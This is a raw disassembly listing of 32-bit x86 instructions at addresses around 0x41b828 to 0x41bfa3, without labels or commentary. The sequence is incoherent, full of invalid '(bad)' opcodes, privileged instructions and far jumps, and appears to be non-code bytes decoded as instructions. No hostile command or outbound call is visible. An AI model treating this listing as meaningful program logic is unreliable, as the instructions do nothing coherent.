  41b828:	mov    esp,0x2c32360b
  41b82d:	movzx  edi,BYTE PTR [ebp+0x7877c14]
  41b834:	adc    eax,0xe8aafd27
  41b839:	inc    esp
  41b83a:	and    esp,esi
  41b83c:	mov    edx,0x635e3716
  41b841:	pop    es
  41b842:	sahf   
  41b843:	sbb    bl,BYTE PTR [ebx+eax*1+0x6c]
  41b847:	push   ebp
  41b848:	add    DWORD PTR [edi+0x1a],edx
  41b84b:	mov    ebx,0x2567a508
  41b850:	dec    esp
  41b851:	ffree  st(7)
  41b853:	aaa    
  41b854:	mov    bl,BYTE PTR ds:0xa9ad12c6
  41b85a:	ds pusha 
  41b85c:	je     0x41b8c7
  41b85e:	aas    
  41b85f:	jne    0x41b83a
  41b861:	add    al,0xdd
  41b863:	mov    ebp,0xd305f73c
  41b868:	js     0x41b7f2
  41b86a:	sub    ecx,ebx
  41b86c:	retf   0x9e3c
  41b86f:	scas   al,BYTE PTR es:[edi]
  41b870:	jnp    0x41b8e0
  41b872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b873:	test   DWORD PTR [eax+edi*1],eax
  41b876:	cmp    DWORD PTR [esi],edi
  41b878:	xor    al,0x32
  41b87a:	xchg   dl,al
  41b87c:	cmp    DWORD PTR [esi+0x4b718f72],0x0
  41b883:	jb     0x41b8d5
  41b885:	fsubr  st,st(4)
  41b887:	nop
  41b888:	lds    esp,FWORD PTR [ebx+0x14]
  41b88b:	mov    BYTE PTR [edi-0x37a12c80],bh
  41b891:	imul   edx,ecx,0xffffffc7
  41b894:	adc    ah,BYTE PTR [ecx+0x62]
  41b897:	call   0x7e63:0x72c1deb0
  41b89e:	cwde   
  41b89f:	push   eax
  41b8a0:	aas    
  41b8a1:	push   eax
  41b8a2:	(bad)  
  41b8a3:	jmp    0x7100:0xa3b27310
  41b8aa:	fwait
  41b8ab:	repnz sub eax,0xb1db55ae
  41b8b1:	dec    ecx
  41b8b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8b3:	inc    ebp
  41b8b4:	in     eax,0xba
  41b8b6:	cld    
  41b8b7:	adc    esp,esp
  41b8b9:	rcr    DWORD PTR [edi*2+0x2598921d],cl
  41b8c0:	and    BYTE PTR [ecx+0x2d],ah
  41b8c3:	fistp  QWORD PTR [edx]
  41b8c5:	inc    eax
  41b8c6:	jb     0x41b92b
  41b8c8:	add    eax,0x9b6791e8
  41b8cd:	or     BYTE PTR [ebx+0x31],bl
  41b8d0:	add    al,0xca
  41b8d2:	mov    bl,0x88
  41b8d4:	arpl   WORD PTR [ebp+0x4],di
  41b8d7:	test   edi,edx
  41b8d9:	cdq    
  41b8da:	loopne 0x41b8a8
  41b8dc:	ret    0x56d4
  41b8df:	aad    0x2b
  41b8e1:	retf   0x1116
  41b8e4:	pop    eax
  41b8e5:	xor    eax,0x87c5141e
  41b8ea:	pop    es
  41b8eb:	mov    dl,0xe4
  41b8ed:	sub    eax,DWORD PTR [ebx+ebx*8]
  41b8f0:	or     edi,DWORD PTR [ebx-0x7b]
  41b8f3:	and    eax,0xd1556b27
  41b8f8:	js     0x41b94d
  41b8fa:	je     0x41b96d
  41b8fc:	test   DWORD PTR [edx],edi
  41b8fe:	sbb    ecx,edx
  41b900:	in     al,0x27
  41b902:	or     DWORD PTR [ebp-0x19824c95],eax
  41b908:	dec    edi
  41b909:	jne    0x41b8fd
  41b90b:	shl    al,0xa3
  41b90e:	jo     0x41b90a
  41b910:	xchg   ecx,eax
  41b911:	fcom   QWORD PTR [ecx+0x6291c80]
  41b917:	ficom  DWORD PTR [esi+0x79395950]
  41b91d:	retf   
  41b91e:	ins    DWORD PTR es:[edi],dx
  41b91f:	out    dx,eax
  41b920:	jle    0x41b98c
  41b922:	add    DWORD PTR [edx-0x4d712644],edx
  41b928:	mov    ch,0x31
  41b92a:	(bad)  
  41b92b:	cmp    dl,BYTE PTR [eax]
  41b92d:	mov    dl,0xc5
  41b92f:	int    0x7e
  41b931:	stc    
  41b932:	and    BYTE PTR [edx],cl
  41b934:	dec    eax
  41b935:	and    ah,BYTE PTR [edx+0x39b36195]
  41b93b:	xor    al,0x58
  41b93d:	xor    ebp,ecx
  41b93f:	pop    ss
  41b940:	add    eax,DWORD PTR [ebp+0x37]
  41b943:	mov    eax,0x29f0977d
  41b948:	arpl   WORD PTR [ebp+0x4b],di
  41b94b:	pop    ss
  41b94c:	mov    esp,0x446e12a3
  41b951:	daa    
  41b952:	test   BYTE PTR [edx],0xde
  41b955:	add    al,dl
  41b957:	mov    dl,0xa2
  41b959:	nop
  41b95a:	pop    eax
  41b95b:	add    cl,bl
  41b95d:	inc    esi
  41b95e:	jg     0x41b959
  41b960:	pop    ds
  41b961:	iret   
  41b962:	mov    esi,0xba979c89
  41b967:	or     dl,BYTE PTR [ecx-0x627f3eb3]
  41b96d:	(bad)  
  41b96e:	in     eax,dx
  41b96f:	in     eax,0x30
  41b971:	iret   
  41b972:	mov    dl,0xba
  41b974:	add    esi,DWORD PTR [eax]
  41b976:	out    dx,al
  41b977:	pop    es
  41b978:	mov    ah,ah
  41b97a:	sahf   
  41b97b:	sub    edx,ebp
  41b97d:	mov    eax,ds:0xe9167ca
  41b982:	xor    ah,bl
  41b984:	pop    edx
  41b985:	sub    BYTE PTR [esi+0x24],cl
  41b988:	shl    al,0xcd
  41b98b:	mov    dl,0x81
  41b98d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b98e:	jge    0x41b9d9
  41b990:	adc    edi,DWORD PTR [ebx-0x1b56aa51]
  41b996:	ins    BYTE PTR es:[edi],dx
  41b997:	dec    esi
  41b998:	pop    eax
  41b999:	iret   
  41b99a:	dec    ebp
  41b99b:	fidiv  DWORD PTR [ecx+0x31]
  41b99e:	ret    
  41b99f:	in     eax,0x93
  41b9a1:	dec    ebp
  41b9a2:	sbb    al,0xa3
  41b9a4:	mov    ebx,0x79a89262
  41b9a9:	pusha  
  41b9aa:	cdq    
  41b9ab:	ja     0x41b982
  41b9ad:	rcl    BYTE PTR [eax],cl
  41b9af:	loop   0x41b961
  41b9b1:	jnp    0x41b9b7
  41b9b3:	test   al,0xdb
  41b9b5:	jecxz  0x41b945
  41b9b7:	js     0x41b95b
  41b9b9:	loopne 0x41b984
  41b9bb:	mov    bh,0x1
  41b9bd:	xor    dl,BYTE PTR [edx]
  41b9bf:	inc    eax
  41b9c0:	inc    ebp
  41b9c1:	xchg   ebp,eax
  41b9c2:	int    0xdb
  41b9c4:	in     al,dx
  41b9c5:	into   
  41b9c6:	mov    ch,0x52
  41b9c8:	sbb    eax,0xb72d687b
  41b9cd:	cld    
  41b9ce:	ds loop 0x41b9d1
  41b9d1:	and    DWORD PTR [ebx],ebp
  41b9d3:	cwde   
  41b9d4:	jge    0x41b9c8
  41b9d6:	test   BYTE PTR [ecx-0x56],0xbe
  41b9da:	(bad)  
  41b9db:	jno    0x41b985
  41b9dd:	sbb    cl,BYTE PTR [ebx-0x59f8c808]
  41b9e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9e4:	stos   BYTE PTR es:[edi],al
  41b9e5:	(bad)  
  41b9e6:	(bad)  
  41b9e8:	xor    al,0x66
  41b9ea:	sub    eax,0xce8633eb
  41b9ef:	and    eax,0xe622b3cb
  41b9f4:	shr    BYTE PTR [ecx+0x77b604f7],cl
  41b9fa:	push   esp
  41b9fb:	mov    bh,0x62
  41b9fd:	mov    cl,0xe5
  41b9ff:	lods   eax,DWORD PTR ds:[esi]
  41ba00:	pop    ds
  41ba01:	pop    esi
  41ba02:	repz loop 0x41b9d1
  41ba05:	dec    esi
  41ba06:	hlt    
  41ba07:	or     DWORD PTR [esi+0x2f],ecx
  41ba0a:	mov    dh,0x79
  41ba0c:	adc    eax,0x138a62fe
  41ba11:	inc    edx
  41ba12:	mov    dl,0xe2
  41ba14:	rol    DWORD PTR [edx+ebx*1],cl
  41ba17:	daa    
  41ba18:	outs   dx,BYTE PTR ds:[esi]
  41ba19:	dec    ebp
  41ba1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba1b:	xor    ah,BYTE PTR [ecx]
  41ba1d:	and    eax,0xfbd203ef
  41ba22:	xlat   BYTE PTR ds:[ebx]
  41ba23:	sub    BYTE PTR [esi+0x12210c47],0xcf
  41ba2a:	sbb    ebp,DWORD PTR [bx+di]
  41ba2d:	jle    0x41ba2a
  41ba2f:	and    al,0xf8
  41ba31:	dec    ebx
  41ba32:	mov    ebp,DWORD PTR [esi+0x30]
  41ba35:	add    eax,0x8d0ccc70
  41ba3a:	ss int3 
  41ba3c:	add    DWORD PTR [ebx],0x5e
  41ba3f:	push   es
  41ba40:	mov    DWORD PTR [edx+0x22a48cbf],edi
  41ba46:	mov    ?,WORD PTR [eax-0x3e0f8a2]
  41ba4c:	pushf  
  41ba4d:	push   esi
  41ba4e:	cmp    BYTE PTR [edx],bh
  41ba50:	pop    eax
  41ba51:	pusha  
  41ba52:	(bad)  
  41ba53:	rol    DWORD PTR [esi],cl
  41ba55:	into   
  41ba56:	mov    esp,eax
  41ba58:	pop    eax
  41ba59:	push   ebp
  41ba5a:	aam    0xb3
  41ba5c:	adc    DWORD PTR [ecx],0x8d95860b
  41ba62:	jns    0x41ba1e
  41ba64:	or     DWORD PTR [ebp-0xe],0x20
  41ba68:	pop    ds
  41ba69:	arpl   WORD PTR [edi+0x4f],bx
  41ba6c:	imul   esp,DWORD PTR [ecx-0x58b0b0c8],0x47
  41ba73:	xor    DWORD PTR [esi+0x1e],edx
  41ba76:	test   eax,esp
  41ba78:	call   0x25aa:0x3d25040d
  41ba7f:	rol    DWORD PTR ds:0x1380460d,1
  41ba85:	ret    0xf840
  41ba88:	js     0x41ba3e
  41ba8a:	data16 fcompp 
  41ba8d:	adc    eax,0xb9c870b5
  41ba92:	mov    BYTE PTR [esi+0x4e],dh
  41ba95:	jl     0x41bb0e
  41ba97:	xchg   esp,eax
  41ba98:	pop    eax
  41ba99:	or     cl,ah
  41ba9b:	iret   
  41ba9c:	pop    ecx
  41ba9d:	sbb    eax,0x7a6c49a8
  41baa2:	sub    esi,DWORD PTR [edx+edi*1+0x7c]
  41baa6:	jle    0x41bab4
  41baa8:	out    0xff,al
  41baaa:	jle    0x41bb20
  41baac:	jp     0x41ba6b
  41baae:	xor    al,0x44
  41bab0:	xor    esi,DWORD PTR [esp+ecx*2]
  41bab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bab5:	test   al,0x4e
  41bab7:	xor    DWORD PTR [eax-0x43],ecx
  41baba:	test   eax,0x1fa3cc77
  41babf:	pop    ebx
  41bac0:	imul   ebx,edi,0x3ce93042
  41bac6:	aad    0x34
  41bac8:	fldcw  WORD PTR [esi+0x65fbce4]
  41bace:	adc    cl,BYTE PTR [edi-0x4bee2b39]
  41bad4:	cmc    
  41bad5:	jg     0x41ba7c
  41bad7:	lods   eax,DWORD PTR ds:[esi]
  41bad8:	test   BYTE PTR [ebx-0x3bbd0040],ah
  41bade:	or     eax,0x6ba4deb0
  41bae3:	adc    eax,0x79270fd3
  41bae8:	pop    ds
  41bae9:	fild   WORD PTR [edx+0x2faafa06]
  41baef:	jecxz  0x41baf2
  41baf1:	adc    DWORD PTR [esi-0x309e1f8e],0xe35c0a45
  41bafb:	mov    ebp,0xad25a9e9
  41bb00:	jo     0x41bad4
  41bb02:	je     0x41bb37
  41bb04:	scas   eax,DWORD PTR es:[edi]
  41bb05:	add    ecx,DWORD PTR [ecx]
  41bb07:	mov    edi,ebp
  41bb09:	mov    eax,0x378f26d
  41bb0e:	mov    ds:0x8bd0b29e,al
  41bb14:	test   BYTE PTR [edi+ecx*2-0x23179325],ch
  41bb1b:	icebp  
  41bb1c:	das    
  41bb1d:	push   ss
  41bb1e:	lea    esp,[esi]
  41bb20:	xchg   esp,eax
  41bb21:	sub    eax,0x8f7161ee
  41bb26:	lea    esi,ds:0x6d9e2a0c
  41bb2c:	push   es
  41bb2d:	mov    ds:0x3e832e85,al
  41bb32:	dec    ebp
  41bb33:	(bad)  
  41bb34:	lahf   
  41bb35:	jmp    0xcf00bc56
  41bb3a:	aad    0x99
  41bb3c:	mov    esp,0xf26ce4a
  41bb41:	adc    eax,0x900999ac
  41bb46:	add    BYTE PTR [edi+0x28cb55b],0x96
  41bb4d:	cmp    eax,0x81585a56
  41bb52:	or     BYTE PTR [ebx+eiz*1+0x6875adab],ah
  41bb59:	in     eax,0x2b
  41bb5b:	xor    bh,BYTE PTR [ecx+0x16e3f7]
  41bb61:	popf   
  41bb62:	mov    ds:0xe4a1a777,eax
  41bb67:	pusha  
  41bb68:	inc    ebx
  41bb69:	ss aaa 
  41bb6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb6c:	fs push edx
  41bb6e:	mov    ds:0x65163275,eax
  41bb73:	pop    ds
  41bb74:	or     eax,0xf6bd53da
  41bb79:	pushf  
  41bb7a:	in     eax,dx
  41bb7b:	inc    esp
  41bb7c:	inc    esi
  41bb7d:	push   esp
  41bb7e:	sbb    BYTE PTR [esi],bl
  41bb80:	fldcw  WORD PTR [ecx-0x55]
  41bb83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb84:	adc    al,0x39
  41bb86:	xchg   ebp,eax
  41bb87:	mov    ds:0xbb8317c,eax
  41bb8c:	je     0x41bb5d
  41bb8e:	sbb    dh,BYTE PTR [ebx+0x76955d5f]
  41bb94:	xchg   ebx,eax
  41bb95:	cdq    
  41bb96:	adc    al,0x90
  41bb98:	add    eax,edx
  41bb9a:	or     eax,0x988458eb
  41bb9f:	xchg   DWORD PTR [ecx-0x4d887b4],ebx
  41bba5:	in     al,dx
  41bba6:	xchg   DWORD PTR [edi-0xf],edx
  41bba9:	mov    edx,0x881dbbbf
  41bbae:	std    
  41bbaf:	stc    
  41bbb0:	mov    esi,0x7e341fb9
  41bbb5:	mov    esp,0xa8fde227
  41bbba:	sahf   
  41bbbb:	push   cs
  41bbbc:	lea    edi,ds:0xaccae5a7
  41bbc2:	sbb    BYTE PTR [eax-0x2cb3966d],dh
  41bbc8:	iret   
  41bbc9:	inc    ebx
  41bbca:	inc    ebp
  41bbcb:	sahf   
  41bbcc:	clc    
  41bbcd:	sub    DWORD PTR [edi-0xd704600],0xffffffd3
  41bbd4:	dec    esp
  41bbd5:	mov    esp,0x75b022bd
  41bbda:	aas    
  41bbdb:	clc    
  41bbdc:	jae    0x41bc39
  41bbde:	adc    eax,0xd9da000
  41bbe3:	push   esi
  41bbe4:	pop    ebx
  41bbe5:	add    DWORD PTR [eax],esi
  41bbe7:	mov    ebx,0xc0e067e0
  41bbec:	mov    al,ds:0xf79723fa
  41bbf1:	and    al,0xe5
  41bbf3:	int3   
  41bbf4:	cld    
  41bbf5:	cmp    ebx,DWORD PTR [edi-0x81355ae]
  41bbfb:	clc    
  41bbfc:	cmc    
  41bbfd:	jae    0x41bc50
  41bbff:	pop    esi
  41bc00:	mov    dl,0x5f
  41bc02:	jo     0x41bbcd
  41bc04:	imul   DWORD PTR [edx-0x6b]
  41bc07:	mov    ecx,esp
  41bc09:	iret   
  41bc0a:	xchg   BYTE PTR [esi+0x62d2d69b],bl
  41bc10:	aas    
  41bc11:	gs or  ebp,0xffffff88
  41bc15:	push   esp
  41bc16:	lods   eax,DWORD PTR ds:[esi]
  41bc17:	xchg   ebp,eax
  41bc18:	daa    
  41bc19:	fnstenv [edx]
  41bc1b:	fisttp QWORD PTR [ecx+0x3b]
  41bc1e:	add    ch,bl
  41bc20:	jp     0x41bc39
  41bc22:	sub    eax,0x873b1c6f
  41bc27:	push   esp
  41bc28:	jnp    0x41bbe5
  41bc2a:	lds    ecx,FWORD PTR [eax+0x64124f57]
  41bc30:	xor    DWORD PTR ds:0x9ac501c6,0xac32014
  41bc3a:	call   0xe5bc:0xbe8771e7
  41bc41:	out    dx,eax
  41bc42:	cli    
  41bc43:	fwait
  41bc44:	lock test DWORD PTR [edx+0x6d7e3ff1],esp
  41bc4b:	pop    ebx
  41bc4c:	mov    bh,0xf7
  41bc4e:	mov    al,ds:0x6c579eea
  41bc53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc54:	jne    0x41bcc7
  41bc56:	push   ss
  41bc57:	push   es
  41bc58:	cmp    esp,edx
  41bc5a:	fwait
  41bc5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc5c:	mov    edx,0x6044c39d
  41bc61:	xor    edi,DWORD PTR [edx]
  41bc63:	inc    ecx
  41bc64:	mov    dh,0x89
  41bc66:	(bad)  
  41bc67:	mov    DWORD PTR [ebx-0x3e],ebx
  41bc6a:	clc    
  41bc6b:	call   0x599f14d7
  41bc70:	cli    
  41bc71:	dec    eax
  41bc72:	dec    ebx
  41bc73:	outs   dx,WORD PTR ds:[esi]
  41bc75:	sbb    al,0xc2
  41bc77:	rcr    BYTE PTR [edx+esi*8+0x3a8e42c4],1
  41bc7e:	dec    esp
  41bc7f:	and    DWORD PTR [esi+0x4d374e3f],0x85f29c30
  41bc89:	fxam   
  41bc8b:	daa    
  41bc8c:	clc    
  41bc8d:	int    0xee
  41bc8f:	xchg   ebx,eax
  41bc90:	mov    ecx,0x340079cb
  41bc95:	nop
  41bc96:	(bad)  
  41bc97:	jge    0x41bc92
  41bc99:	enter  0x6351,0x50
  41bc9d:	mov    cl,0xd9
  41bc9f:	adc    DWORD PTR [ebp-0x64],ecx
  41bca2:	sbb    eax,DWORD PTR [esi]
  41bca4:	idiv   BYTE PTR [edx]
  41bca6:	inc    edx
  41bca7:	pcmpgtw mm2,QWORD PTR [edx]
  41bcaa:	xchg   dh,dh
  41bcac:	adc    BYTE PTR [ecx-0x4dfe1c4d],0xa7
  41bcb3:	mov    BYTE PTR [eax+0x3c],0xe8
  41bcb7:	sub    BYTE PTR [ecx-0x4c3865f8],dl
  41bcbd:	test   BYTE PTR [edi+0x35c7453c],bh
  41bcc3:	sbb    eax,0xe3bec668
  41bcc8:	aad    0x53
  41bcca:	fisttp QWORD PTR [edx]
  41bccc:	es iret 
  41bcce:	ins    DWORD PTR es:[edi],dx
  41bccf:	sbb    eax,0x82843503
  41bcd4:	sub    edx,DWORD PTR [ecx]
  41bcd6:	mov    al,ds:0xeea5c6a2
  41bcdb:	mov    ds:0x7b5e685f,eax
  41bce0:	out    0xa4,al
  41bce2:	(bad)  
  41bce3:	out    dx,al
  41bce4:	rcl    BYTE PTR [ebx],1
  41bce6:	in     eax,0x5c
  41bce8:	popa   
  41bce9:	dec    ebp
  41bcea:	retf   0xde5c
  41bced:	nop
  41bcee:	int    0x42
  41bcf0:	test   BYTE PTR [ebx-0x3f5de604],dh
  41bcf6:	int3   
  41bcf7:	(bad)  
  41bcf8:	loop   0x41bc89
  41bcfa:	pop    edx
  41bcfb:	jbe    0x41bd18
  41bcfd:	mov    dl,dh
  41bcff:	xor    cl,BYTE PTR [esi-0x2ccf86dd]
  41bd05:	out    dx,eax
  41bd06:	sub    esi,0x2
  41bd09:	mov    ds,ebp
  41bd0b:	sbb    al,0x1
  41bd0d:	clc    
  41bd0e:	xchg   esp,eax
  41bd0f:	push   es
  41bd10:	sub    bh,BYTE PTR [eax+edi*1+0x51e7e983]
  41bd17:	inc    esi
  41bd18:	mov    edx,0xabfb309e
  41bd1d:	mov    BYTE PTR [eax],dl
  41bd1f:	and    BYTE PTR [esi+edi*2+0x763836b3],al
  41bd26:	imul   edx,DWORD PTR [ebp+0x13],0x36eb9342
  41bd2d:	iret   
  41bd2e:	fwait
  41bd2f:	out    dx,eax
  41bd30:	loop   0x41bcd3
  41bd32:	aad    0x40
  41bd34:	in     al,0x9d
  41bd36:	or     BYTE PTR [esi],ch
  41bd38:	inc    edi
  41bd39:	mov    ah,0xa4
  41bd3b:	jae    0x41bd23
  41bd3d:	jo     0x41bd7f
  41bd3f:	(bad)  [edi-0x71601a7a]
  41bd45:	adc    al,0xbc
  41bd47:	popa   
  41bd48:	jbe    0x41bd98
  41bd4a:	jno    0x41bd43
  41bd4c:	gs jmp 0xc93c:0xc0ad6db8
  41bd54:	mov    dl,0x66
  41bd56:	adc    dh,bl
  41bd58:	shl    DWORD PTR [ecx-0x1a],0xa8
  41bd5c:	sbb    ebx,edi
  41bd5e:	inc    ebp
  41bd5f:	adc    edi,edx
  41bd61:	xor    BYTE PTR [esi],dl
  41bd63:	out    0xab,eax
  41bd65:	test   DWORD PTR [ebx+ebp*4+0x7b3c4700],ecx
  41bd6c:	and    al,0xc2
  41bd6e:	stos   BYTE PTR es:[edi],al
  41bd6f:	jns    0x41bdd1
  41bd71:	int    0x15
  41bd73:	jno    0x41bd1b
  41bd75:	imul   ebx,ebx,0xffffffae
  41bd78:	dec    ebp
  41bd79:	mov    dl,0x8f
  41bd7b:	add    ecx,ebx
  41bd7d:	jmp    0x10a46e40
  41bd82:	sub    eax,0x4dcd02c4
  41bd87:	push   di
  41bd89:	mov    dl,0x40
  41bd8b:	iret   
  41bd8c:	fdivr  DWORD PTR [ebx+ecx*4+0x24]
  41bd90:	or     DWORD PTR ds:0x96c8f47,esp
  41bd96:	adc    bl,BYTE PTR [ecx]
  41bd98:	jb     0x41bdfe
  41bd9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd9b:	fwait
  41bd9c:	push   cs
  41bd9d:	xor    al,0x76
  41bd9f:	sub    al,0x65
  41bda1:	inc    esp
  41bda2:	jmp    0xe6d3:0xe179da14
  41bda9:	stos   BYTE PTR es:[edi],al
  41bdaa:	(bad)  
  41bdab:	leave  
  41bdac:	sub    al,0x8b
  41bdae:	(bad)  [ecx-0x2d132f93]
  41bdb4:	or     bl,BYTE PTR [eax-0x77]
  41bdb7:	ins    DWORD PTR es:[edi],dx
  41bdb8:	sbb    ebp,DWORD PTR [esi+0x27]
  41bdbb:	adc    al,0x36
  41bdbd:	bnd jnp 0x41bd9e
  41bdc0:	push   ds
  41bdc1:	sub    ebp,edx
  41bdc3:	jo     0x41bd80
  41bdc5:	pop    ecx
  41bdc6:	mov    eax,0xfd9a2662
  41bdcb:	retf   0x2985
  41bdce:	cdq    
  41bdcf:	out    0x78,eax
  41bdd1:	stos   BYTE PTR es:[edi],al
  41bdd2:	daa    
  41bdd3:	lea    ebx,[ebp+0x6e]
  41bdd6:	pushf  
  41bdd7:	adc    cl,0x8d
  41bdda:	sub    eax,ebx
  41bddc:	lods   al,BYTE PTR ds:[esi]
  41bddd:	inc    ebp
  41bdde:	stc    
  41bddf:	add    BYTE PTR [esi-0x6ad0a07e],cl
  41bde5:	jnp    0x41bde5
  41bde7:	push   0x9cb05f5a
  41bdec:	outs   dx,BYTE PTR ds:[esi]
  41bded:	sti    
  41bdee:	dec    ebx
  41bdef:	std    
  41bdf0:	jmp    0x41bdd6
  41bdf2:	jmp    0x41be49
  41bdf4:	inc    ebp
  41bdf5:	in     al,0xa
  41bdf7:	js     0x41be31
  41bdf9:	ja     0x41bdb8
  41bdfb:	jnp    0x41bdf2
  41bdfd:	(bad)  
  41bdfe:	lahf   
  41bdff:	push   ecx
  41be00:	mov    dh,0xfd
  41be02:	call   0x2cfa:0x377b7ed1
  41be09:	aas    
  41be0a:	test   al,0x29
  41be0c:	fstp   DWORD PTR [edx+0xc196e9f]
  41be12:	jo     0x41be86
  41be14:	sub    BYTE PTR [ecx],cl
  41be16:	or     eax,0x4ec17cca
  41be1b:	push   eax
  41be1c:	adc    BYTE PTR [esi+0x2a],dl
  41be1f:	cmp    edx,DWORD PTR [ebp+0x3a420b17]
  41be25:	sahf   
  41be26:	jns    0x41bdbc
  41be28:	(bad)  
  41be29:	push   es
  41be2a:	clc    
  41be2b:	dec    esp
  41be2c:	popaw  
  41be2e:	(bad)  
  41be2f:	data16 repnz mov gs,WORD PTR [ecx]
  41be33:	out    0x9a,al
  41be35:	push   edx
  41be36:	dec    edx
  41be37:	iret   
  41be38:	jecxz  0x41be4f
  41be3a:	mov    ah,0x92
  41be3c:	fadd   st(0),st
  41be3e:	or     ch,BYTE PTR [ebx]
  41be40:	add    cl,BYTE PTR [esi]
  41be42:	jmp    0x41be14
  41be44:	shr    BYTE PTR [ebx+0x4aa0aabb],cl
  41be4a:	popa   
  41be4b:	mov    eax,ds:0x9bd290a8
  41be50:	scas   al,BYTE PTR es:[edi]
  41be51:	setnp  BYTE PTR [ebx+0x18d166da]
  41be58:	aas    
  41be59:	imul   edi,DWORD PTR [ebx+0x76],0x3e
  41be5d:	push   ebx
  41be5e:	jle    0x41bdf8
  41be60:	leave  
  41be61:	test   eax,0x527802b2
  41be66:	cdq    
  41be67:	push   ds
  41be68:	push   0xb976aeb5
  41be6d:	sub    al,0x7c
  41be6f:	xchg   ecx,eax
  41be70:	push   ecx
  41be71:	arpl   WORD PTR [ecx-0x5d],cx
  41be74:	aaa    
  41be75:	fisub  DWORD PTR [eax+esi*8]
  41be78:	stos   DWORD PTR es:[edi],eax
  41be79:	popf   
  41be7a:	push   0xffffff9d
  41be7c:	sub    DWORD PTR ds:0x33df41d2,edi
  41be82:	popa   
  41be83:	jb     0x41be9c
  41be85:	jns    0x41bef4
  41be87:	ror    bh,1
  41be89:	fisub  DWORD PTR [eax]
  41be8b:	xchg   ebp,eax
  41be8c:	jp     0x41be56
  41be8e:	mov    dh,BYTE PTR [edx]
  41be90:	sar    DWORD PTR [ecx+0x2cc905c],cl
  41be96:	out    0xb7,eax
  41be98:	push   edx
  41be99:	fisub  WORD PTR [eax+ecx*4+0x79ae63c0]
  41bea0:	or     al,0xc3
  41bea2:	cld    
  41bea3:	jl     0x41bee1
  41bea5:	pop    es
  41bea6:	push   cs
  41bea7:	gs out dx,eax
  41bea9:	popf   
  41beaa:	ror    BYTE PTR [ebx-0x2b8af1ac],0xb1
  41beb1:	mov    edx,0x8e87b29f
  41beb6:	loop   0x41bee5
  41beb8:	push   ecx
  41beb9:	or     eax,0xf2b1d5a2
  41bebe:	(bad)  
  41bebf:	cmp    eax,edi
  41bec1:	xor    ecx,DWORD PTR [eax]
  41bec3:	xchg   DWORD PTR ds:0xbdc0c91d,ecx
  41bec9:	pop    esp
  41beca:	or     eax,0xc584c80e
  41becf:	xchg   edx,eax
  41bed0:	int    0x3c
  41bed2:	mov    ebp,edx
  41bed4:	mov    BYTE PTR [ecx],ah
  41bed6:	jmp    FWORD PTR [eax+ecx*1+0x6f]
  41beda:	mov    dl,0x8
  41bedc:	into   
  41bedd:	(bad)  
  41bede:	fdivr  st(6),st
  41bee0:	xor    BYTE PTR [ebp+0x47eb64ab],dl
  41bee6:	sub    eax,0xe5c804ae
  41beeb:	and    ebp,esi
  41beed:	mov    al,0xd
  41beef:	je     0x41bec7
  41bef1:	lahf   
  41bef2:	ret    
  41bef3:	fs mov ecx,0x40abf62
  41bef9:	outs   dx,BYTE PTR ds:[esi]
  41befa:	add    ebx,DWORD PTR [ebp+0x26c0c5b9]
  41bf00:	sub    al,0x21
  41bf02:	push   es
  41bf03:	fwait
  41bf04:	push   eax
  41bf05:	jle    0x41bf42
  41bf07:	jmp    0x7e6:0x45cba78e
  41bf0e:	test   esp,edi
  41bf10:	retf   0xc6ea
  41bf13:	push   0x79ecb62a
  41bf18:	add    al,0xf9
  41bf1a:	sub    DWORD PTR [ecx-0x3],edi
  41bf1d:	pop    edi
  41bf1e:	jne    0x41beb9
  41bf20:	sbb    ecx,0xa3005f15
  41bf26:	pop    esi
  41bf27:	pop    ebp
  41bf28:	sbb    DWORD PTR [esi],0x1f1412e3
  41bf2e:	loop   0x41bf45
  41bf30:	rol    BYTE PTR [ebp-0x64],0xc
  41bf34:	inc    ebx
  41bf35:	mov    cl,0x3a
  41bf37:	mov    dh,0x1b
  41bf39:	cdq    
  41bf3a:	inc    esp
  41bf3b:	lods   al,BYTE PTR ds:[esi]
  41bf3c:	dec    esp
  41bf3d:	scas   eax,DWORD PTR es:[edi]
  41bf3e:	push   esi
  41bf3f:	ins    DWORD PTR es:[edi],dx
  41bf40:	jle    0x41bf78
  41bf42:	test   BYTE PTR ds:0x768b34b4,0x33
  41bf49:	pop    ebp
  41bf4a:	jb     0x41bf4e
  41bf4c:	inc    ebx
  41bf4d:	xchg   edi,eax
  41bf4e:	(bad)  
  41bf4f:	push   ss
  41bf50:	fidiv  WORD PTR [edx]
  41bf52:	test   al,0xf1
  41bf54:	add    esi,DWORD PTR [esi+ecx*4]
  41bf57:	aaa    
  41bf58:	push   ss
  41bf59:	xchg   edx,eax
  41bf5a:	xor    ebp,0x9222f99c
  41bf60:	ror    esp,1
  41bf62:	out    0xf7,eax
  41bf64:	xlat   BYTE PTR ds:[ebx]
  41bf65:	fbld   TBYTE PTR [ebp-0x3fdc7c99]
  41bf6b:	test   al,0x1a
  41bf6d:	pop    ebp
  41bf6e:	and    DWORD PTR [eax],esi
  41bf70:	jae    0x41bf8f
  41bf72:	pop    edx
  41bf73:	popa   
  41bf74:	xrelease xacquire xchg BYTE PTR [esi-0x20],cl
  41bf79:	jge    0x41bf07
  41bf7b:	(bad)  
  41bf7c:	dec    ebx
  41bf7d:	sbb    dl,BYTE PTR [eax]
  41bf7f:	fadd   DWORD PTR [edx]
  41bf81:	mov    edx,0x2971f636
  41bf86:	ja     0x41bf61
  41bf88:	test   DWORD PTR [ebx],0x78580e66
  41bf8e:	mov    esp,gs
  41bf90:	in     eax,dx
  41bf91:	jmp    0xd629:0x9003636c
  41bf98:	retf   
  41bf99:	pop    edx
  41bf9a:	pop    es
  41bf9b:	cld    
  41bf9c:	pop    ebx
  41bf9d:	xor    ebx,DWORD PTR [edx-0x5961e6e2]
  41bfa3:	fild   DWORD PTR [esi+0xc53b9cf]
